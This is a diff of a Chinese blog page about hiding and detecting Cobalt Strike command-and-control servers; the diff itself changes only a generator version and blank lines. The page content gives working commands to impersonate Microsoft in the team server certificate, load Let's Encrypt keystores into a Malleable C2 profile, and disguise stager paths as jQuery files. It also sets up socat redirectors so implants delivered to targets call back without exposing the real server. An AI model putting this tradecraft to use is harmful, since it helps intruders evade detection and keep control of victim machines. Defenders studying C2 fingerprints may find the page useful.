@@ -46,7 +46,7 @@
 </script>
 
     <title>检测与隐藏Cobaltstrike服务器 - Blog</title>
-  <meta name="generator" content="Hexo 5.0.2"></head>
+  <meta name="generator" content="Hexo 5.3.0"></head>
 
   <body><div id="mobile-navbar" class="mobile-navbar">
   <div class="mobile-header-logo">
@@ -135,17 +135,14 @@
 <p><img src="/img/jcyyccss_b.png"></p>
 <p>然后删除默认的并重签一个伪造证书，重启CS后再用<code>nmap -p- -A -vv</code>扫描时已经消除该特征。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm ./cobaltstrike.store</span><br><span class="line">sed -i <span class="string">&#x27;s!-alias cobaltstrike -dname &quot;CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth&quot;!-alias microsoft.com -dname &quot;CN=Microsoft Windows, OU=MOPR, O=Microsoft Corporation, L=Redmond, ST=Washington, C=US&quot;!g&#x27;</span> teamserver</span><br></pre></td></tr></table></figure>
-
 <p><img src="/img/jcyyccss_c.png"></p>
 <h2 id="HTTPS证书"><a href="#HTTPS证书" class="headerlink" title="HTTPS证书"></a>HTTPS证书</h2><p>改了远控服务端证书后，抓包可以发现通过HTTPS的Beacon上线机器用的证书并不是同一个，而且同样存在可被识别的固定特征。</p>
 <p><img src="/img/jcyyccss_w.png"></p>
 <p><img src="/img/jcyyccss_x.png"></p>
 <p>可以向<code>Let&#39;s Encrypt</code>申请一个免费证书并打包为keystore，用来替换CS自带的https证书。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 申请免费证书</span></span><br><span class="line">apt install certbot</span><br><span class="line">certbot certonly --standalone -d update.domain.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将证书打包并生成store文件</span></span><br><span class="line">openssl pkcs12 -<span class="built_in">export</span> -<span class="keyword">in</span> /etc/letsencrypt/live/update.domain.com/fullchain.pem -inkey /etc/letsencrypt/live/update.domain.com/privkey.pem -out update.domain.com.p12 -name update.domain.com -passout pass:123456</span><br><span class="line"></span><br><span class="line">keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore update.domain.com.store -srckeystore update.domain.com.p12 -srcstoretype PKCS12 -srcstorepass 123456 -<span class="built_in">alias</span> update.domain.com</span><br></pre></td></tr></table></figure>
-
 <p>接下来就需要用到<a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/help-malleable-c2">Malleable C2 profile</a>来引入我们自己申请的证书。以<code>amazon.profile</code>为例，将刚才生成的store文件放到CS目录下，向<code>amazon.profile</code>文件追加证书配置：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">https-certificate &#123;</span></span><br><span class="line"><span class="string">    set keystore &quot;update.domain.com.store&quot;;</span></span><br><span class="line"><span class="string">    set password &quot;123456&quot;;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> &gt;&gt; amazon.profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顺带把dns_idle和stager路径也改了</span></span><br><span class="line">sed -i <span class="string">&#x27;11i\set dns_idle &quot;8.8.8.8&quot;;&#x27;</span> amazon.profile</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">http-stager &#123;</span></span><br><span class="line"><span class="string">    set uri_x86 &quot;/jquery.min.js&quot;;</span></span><br><span class="line"><span class="string">    set uri_x64 &quot;/jquery.debug.js&quot;;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> &gt;&gt; amazon.profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查配置文件有效性</span></span><br><span class="line">./c2lint amazon.profile</span><br></pre></td></tr></table></figure>
-
 <p><img src="/img/jcyyccss_y.png"></p>
 <p>再通过<code>nohup ./teamserver IP password amazon.profile &amp;</code>启动后抓上线包，证书就是自己申请的了</p>
 <hr>
@@ -160,7 +157,6 @@
 <p><img src="/img/jcyyccss_e.png"></p>
 <p>II. 在临时工机器上安装socat并进行端口转发</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apt install socat</span><br><span class="line"></span><br><span class="line">socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80 &amp;</span><br><span class="line">socat TCP4-LISTEN:443,fork TCP4:1.1.1.1:443 &amp;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可用 netstat -pantu | grep socat 查看后台转发的端口，kill PID 中止转发</span></span><br></pre></td></tr></table></figure>
-
 <p>III. 创建CS的Listener，设置回连地址为临时工的IP</p>
 <p><img src="/img/jcyyccss_f.png"></p>
 <p>IV. 向目标投递马子并执行，然后坐等上线即可</p>
@@ -198,11 +194,9 @@
 <p>I. 首先编写转发代码时，URL后不要再加斜杠<code>/</code>了，不然到了CS那可能会成双斜杠<code>//</code>，转发的协议也要跟CS的Listener类型要对得上。比如位于<code>1.1.1.1</code>机器上的CS有一个https的Listener，那转发代码的URL就要写成<code>https://1.1.1.1</code></p>
 <p>II. 为了用自己搞的HTTPS证书就会要套profile，如果在<a target="_blank" rel="noopener" href="https://github.com/rsmudge/Malleable-C2-Profiles">Malleable-C2-Profiles</a>的基础上改，一定要修改或是注释掉里面<code>header &quot;Host&quot;</code>部分。至于原因，想想之前介绍的CDN如何区分不同站点就明白了。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/header &quot;Host&quot;/#header &quot;Host&quot;/g&#x27;</span> amazon.profile</span><br></pre></td></tr></table></figure>
-
 <p>III. 云函数会有 前端/后端 请求超时时间，建议把这个秒数稍微调大点，不然stage的马可能来不及走完流程就被挂了。</p>
 <h2 id="stager"><a href="#stager" class="headerlink" title="stager"></a>stager</h2><p>CS的stage马上线时，默认会向一个符合checksum8规则的路径发起请求，随后服务器会响应各种Payload数据。checksum8规则路径大概就长这样：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;x9cI&#x2F;</span><br><span class="line">&#x2F;fYKR&#x2F;</span><br><span class="line">&#x2F;Mrm0&#x2F;</span><br><span class="line">&#x2F;wQPD&#x2F;</span><br><span class="line">&#x2F;yDHX&#x2F;</span><br><span class="line">&#x2F;BCre&#x2F;</span><br><span class="line">&#x2F;WHVh&#x2F;</span><br></pre></td></tr></table></figure>
-
 <p>在profile中配置<code>http-stager</code>可以改变stage马的默认请求路径：</p>
 <p><img src="/img/jcyyccss_l.png"></p>
 <p>但这并不会让之前的默认规则失效，此时通过checksum8规则路径依然是可以正常上线执行命令的。</p>
